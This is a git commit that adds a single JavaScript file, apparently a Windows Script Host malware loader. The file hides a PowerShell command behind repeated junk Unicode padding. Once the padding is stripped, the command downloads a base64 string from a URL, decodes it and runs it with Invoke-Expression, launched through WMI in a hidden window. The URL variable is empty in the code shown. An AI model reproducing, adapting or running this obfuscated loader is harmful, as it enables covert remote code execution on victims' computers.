faa8a537cde66df2340a82234a757fe26832655b
rafabashar77-sudo <rafabashar77@gmail.com>
2025-08-22 16:22:38 -0300

    asasas

---
+++ 23232332.js
@@ -0,0 +1,30 @@
+var Ceqli = new ActiveXObject("Scripting.FileSystemObject");
+var payor = Ceqli.GetParentFolderName(WScript.ScriptFullName);
+var cunne = GetObject("winmgmts:root\\cimv2");
+var antipathacean = cunne.Get("Win32_ProcessStartup").SpawnInstance_();
+antipathacean.ShowWindow = 0; 
+var psychedelia = cunne.Get("Win32_Process");
+
+var deducibly = "";
+deducibly = deducibly.replace(/᢮⟎ऀઞᑩද⊟ⴘ🏍⦇๚⍓⇋ᇚᱫ/g, "");
+var acaudal = 'ᢕℾᓚΥݡ੅ᩊÑᛏۋ౪ွᰢ🖜ྦྷpᢕℾᓚΥݡ੅ᩊÑᛏۋ౪ွᰢ🖜ྦྷoᢕℾᓚΥݡ੅ᩊÑᛏۋ౪ွᰢ🖜ྦྷwᢕℾᓚΥݡ੅ᩊÑᛏۋ౪ွᰢ🖜ྦྷ';
+acaudal = acaudal + 'ᢕℾᓚΥݡ੅ᩊÑᛏۋ౪ွᰢ🖜ྦྷeᢕℾᓚΥݡ੅ᩊÑᛏۋ౪ွᰢ🖜ྦྷrᢕℾᓚΥݡ੅ᩊÑᛏۋ౪ွᰢ🖜ྦྷsᢕℾᓚΥݡ੅ᩊÑᛏۋ౪ွᰢ🖜ྦྷ';
+acaudal = acaudal + 'ᢕℾᓚΥݡ੅ᩊÑᛏۋ౪ွᰢ🖜ྦྷhᢕℾᓚΥݡ੅ᩊÑᛏۋ౪ွᰢ🖜ྦྷeᢕℾᓚΥݡ੅ᩊÑᛏۋ౪ွᰢ🖜ྦྷlᢕℾᓚΥݡ੅ᩊÑᛏۋ౪ွᰢ🖜ྦྷl -ᢕℾᓚΥݡ੅ᩊÑᛏۋ౪ွᰢ🖜ྦྷ';
+acaudal = acaudal + 'ᢕℾᓚΥݡ੅ᩊÑᛏۋ౪ွᰢ🖜ྦྷNoᢕℾᓚΥݡ੅ᩊÑᛏۋ౪ွᰢ🖜ྦྷPrᢕℾᓚΥݡ੅ᩊÑᛏۋ౪ွᰢ🖜ྦྷ';
+acaudal = acaudal + 'ᢕℾᓚΥݡ੅ᩊÑᛏۋ౪ွᰢ🖜ྦྷoᢕℾᓚΥݡ੅ᩊÑᛏۋ౪ွᰢ🖜ྦྷfiᢕℾᓚΥݡ੅ᩊÑᛏۋ౪ွᰢ🖜ྦྷle ᢕℾᓚΥݡ੅ᩊÑᛏۋ౪ွᰢ🖜ྦྷ';
+acaudal = acaudal + 'ᢕℾᓚΥݡ੅ᩊÑᛏۋ౪ွᰢ🖜ྦྷ-WᢕℾᓚΥݡ੅ᩊÑᛏۋ౪ွᰢ🖜ྦྷinᢕℾᓚΥݡ੅ᩊÑᛏۋ౪ွᰢ🖜ྦྷ';
+acaudal = acaudal + 'ᢕℾᓚΥݡ੅ᩊÑᛏۋ౪ွᰢ🖜ྦྷdᢕℾᓚΥݡ੅ᩊÑᛏۋ౪ွᰢ🖜ྦྷowᢕℾᓚΥݡ੅ᩊÑᛏۋ౪ွᰢ🖜ྦྷStᢕℾᓚΥݡ੅ᩊÑᛏۋ౪ွᰢ🖜ྦྷ';
+acaudal = acaudal + 'ᢕℾᓚΥݡ੅ᩊÑᛏۋ౪ွᰢ🖜ྦྷyᢕℾᓚΥݡ੅ᩊÑᛏۋ౪ွᰢ🖜ྦྷle HᢕℾᓚΥݡ੅ᩊÑᛏۋ౪ွᰢ🖜ྦྷ';
+acaudal = acaudal + 'ᢕℾᓚΥݡ੅ᩊÑᛏۋ౪ွᰢ🖜ྦྷiᢕℾᓚΥݡ੅ᩊÑᛏۋ౪ွᰢ🖜ྦྷddᢕℾᓚΥݡ੅ᩊÑᛏۋ౪ွᰢ🖜ྦྷen ᢕℾᓚΥݡ੅ᩊÑᛏۋ౪ွᰢ🖜ྦྷ';
+acaudal = acaudal + 'ᢕℾᓚΥݡ੅ᩊÑᛏۋ౪ွᰢ🖜ྦྷ-CoᢕℾᓚΥݡ੅ᩊÑᛏۋ౪ွᰢ🖜ྦྷmmᢕℾᓚΥݡ੅ᩊÑᛏۋ౪ွᰢ🖜ྦྷ';
+acaudal = acaudal + 'ᢕℾᓚΥݡ੅ᩊÑᛏۋ౪ွᰢ🖜ྦྷanᢕℾᓚΥݡ੅ᩊÑᛏۋ౪ွᰢ🖜ྦྷd "ᢕℾᓚΥݡ੅ᩊÑᛏۋ౪ွᰢ🖜ྦྷ';
+
+acaudal = acaudal + 'ᢕℾᓚΥݡ੅ᩊÑᛏۋ౪ွᰢ🖜ྦྷ$wᢕℾᓚΥݡ੅ᩊÑᛏۋ౪ွᰢ🖜ྦྷc=NeᢕℾᓚΥݡ੅ᩊÑᛏۋ౪ွᰢ🖜ྦྷw-ObjᢕℾᓚΥݡ੅ᩊÑᛏۋ౪ွᰢ🖜ྦྷect ᢕℾᓚΥݡ੅ᩊÑᛏۋ౪ွᰢ🖜ྦྷSyᢕℾᓚΥݡ੅ᩊÑᛏۋ౪ွᰢ🖜ྦྷstᢕℾᓚΥݡ੅ᩊÑᛏۋ౪ွᰢ🖜ྦྷem.NᢕℾᓚΥݡ੅ᩊÑᛏۋ౪ွᰢ🖜ྦྷet.WᢕℾᓚΥݡ੅ᩊÑᛏۋ౪ွᰢ🖜ྦྷebᢕℾᓚΥݡ੅ᩊÑᛏۋ౪ွᰢ🖜ྦྷClᢕℾᓚΥݡ੅ᩊÑᛏۋ౪ွᰢ🖜ྦྷiᢕℾᓚΥݡ੅ᩊÑᛏۋ౪ွᰢ🖜ྦྷentᢕℾᓚΥݡ੅ᩊÑᛏۋ౪ွᰢ🖜ྦྷ; ';
+acaudal = acaudal + 'ᢕℾᓚΥݡ੅ᩊÑᛏۋ౪ွᰢ🖜ྦྷ$ᢕℾᓚΥݡ੅ᩊÑᛏۋ౪ွᰢ🖜ྦྷwc.ᢕℾᓚΥݡ੅ᩊÑᛏۋ౪ွᰢ🖜ྦྷHeaᢕℾᓚΥݡ੅ᩊÑᛏۋ౪ွᰢ🖜ྦྷders.ᢕℾᓚΥݡ੅ᩊÑᛏۋ౪ွᰢ🖜ྦྷAdd(ᢕℾᓚΥݡ੅ᩊÑᛏۋ౪ွᰢ🖜ྦྷ\'UseᢕℾᓚΥݡ੅ᩊÑᛏۋ౪ွᰢ🖜ྦྷr-AgentᢕℾᓚΥݡ੅ᩊÑᛏۋ౪ွᰢ🖜ྦྷ\',\'MᢕℾᓚΥݡ੅ᩊÑᛏۋ౪ွᰢ🖜ྦྷozᢕℾᓚΥݡ੅ᩊÑᛏۋ౪ွᰢ🖜ྦྷillaᢕℾᓚΥݡ੅ᩊÑᛏۋ౪ွᰢ🖜ྦྷ/5.0\'); ';
+acaudal = acaudal + 'ᢕℾᓚΥݡ੅ᩊÑᛏۋ౪ွᰢ🖜ྦྷ$b6ᢕℾᓚΥݡ੅ᩊÑᛏۋ౪ွᰢ🖜ྦྷ4=$wᢕℾᓚΥݡ੅ᩊÑᛏۋ౪ွᰢ🖜ྦྷc.DowᢕℾᓚΥݡ੅ᩊÑᛏۋ౪ွᰢ🖜ྦྷnloaᢕℾᓚΥݡ੅ᩊÑᛏۋ౪ွᰢ🖜ྦྷdStᢕℾᓚΥݡ੅ᩊÑᛏۋ౪ွᰢ🖜ྦྷrinᢕℾᓚΥݡ੅ᩊÑᛏۋ౪ွᰢ🖜ྦྷg(\'' + deducibly + '\'); ';
+acaudal = acaudal + 'ᢕℾᓚΥݡ੅ᩊÑᛏۋ౪ွᰢ🖜ྦྷ[SyᢕℾᓚΥݡ੅ᩊÑᛏۋ౪ွᰢ🖜ྦྷstᢕℾᓚΥݡ੅ᩊÑᛏۋ౪ွᰢ🖜ྦྷeᢕℾᓚΥݡ੅ᩊÑᛏۋ౪ွᰢ🖜ྦྷm.TᢕℾᓚΥݡ੅ᩊÑᛏۋ౪ွᰢ🖜ྦྷexᢕℾᓚΥݡ੅ᩊÑᛏۋ౪ွᰢ🖜ྦྷt.EnᢕℾᓚΥݡ੅ᩊÑᛏۋ౪ွᰢ🖜ྦྷcoᢕℾᓚΥݡ੅ᩊÑᛏۋ౪ွᰢ🖜ྦྷdiᢕℾᓚΥݡ੅ᩊÑᛏۋ౪ွᰢ🖜ྦྷnᢕℾᓚΥݡ੅ᩊÑᛏۋ౪ွᰢ🖜ྦྷg]::UᢕℾᓚΥݡ੅ᩊÑᛏۋ౪ွᰢ🖜ྦྷTFᢕℾᓚΥݡ੅ᩊÑᛏۋ౪ွᰢ🖜ྦྷ8.GeᢕℾᓚΥݡ੅ᩊÑᛏۋ౪ွᰢ🖜ྦྷtStrᢕℾᓚΥݡ੅ᩊÑᛏۋ౪ွᰢ🖜ྦྷing([SyᢕℾᓚΥݡ੅ᩊÑᛏۋ౪ွᰢ🖜ྦྷsteᢕℾᓚΥݡ੅ᩊÑᛏۋ౪ွᰢ🖜ྦྷm.ᢕℾᓚΥݡ੅ᩊÑᛏۋ౪ွᰢ🖜ྦྷCᢕℾᓚΥݡ੅ᩊÑᛏۋ౪ွᰢ🖜ྦྷonveᢕℾᓚΥݡ੅ᩊÑᛏۋ౪ွᰢ🖜ྦྷrt]ᢕℾᓚΥݡ੅ᩊÑᛏۋ౪ွᰢ🖜ྦྷ:ᢕℾᓚΥݡ੅ᩊÑᛏۋ౪ွᰢ🖜ྦྷ:FromBᢕℾᓚΥݡ੅ᩊÑᛏۋ౪ွᰢ🖜ྦྷasᢕℾᓚΥݡ੅ᩊÑᛏۋ౪ွᰢ🖜ྦྷe64ᢕℾᓚΥݡ੅ᩊÑᛏۋ౪ွᰢ🖜ྦྷStᢕℾᓚΥݡ੅ᩊÑᛏۋ౪ွᰢ🖜ྦྷring(ᢕℾᓚΥݡ੅ᩊÑᛏۋ౪ွᰢ🖜ྦྷ$b64ᢕℾᓚΥݡ੅ᩊÑᛏۋ౪ွᰢ🖜ྦྷ)) | ᢕℾᓚΥݡ੅ᩊÑᛏۋ౪ွᰢ🖜ྦྷInᢕℾᓚΥݡ੅ᩊÑᛏۋ౪ွᰢ🖜ྦྷvoᢕℾᓚΥݡ੅ᩊÑᛏۋ౪ွᰢ🖜ྦྷkeᢕℾᓚΥݡ੅ᩊÑᛏۋ౪ွᰢ🖜ྦྷ-EᢕℾᓚΥݡ੅ᩊÑᛏۋ౪ွᰢ🖜ྦྷxpᢕℾᓚΥݡ੅ᩊÑᛏۋ౪ွᰢ🖜ྦྷressionᢕℾᓚΥݡ੅ᩊÑᛏۋ౪ွᰢ🖜ྦྷ"';
+
+acaudal = acaudal.replace(/ᢕℾᓚΥݡ੅ᩊÑᛏۋ౪ွᰢ🖜ྦྷ/g, ""); 
+
+var curtainwall = new ActiveXObject("WScript.Shell"); 
+var halse = psychedelia.Create(acaudal, payor, antipathacean, curtainwall);
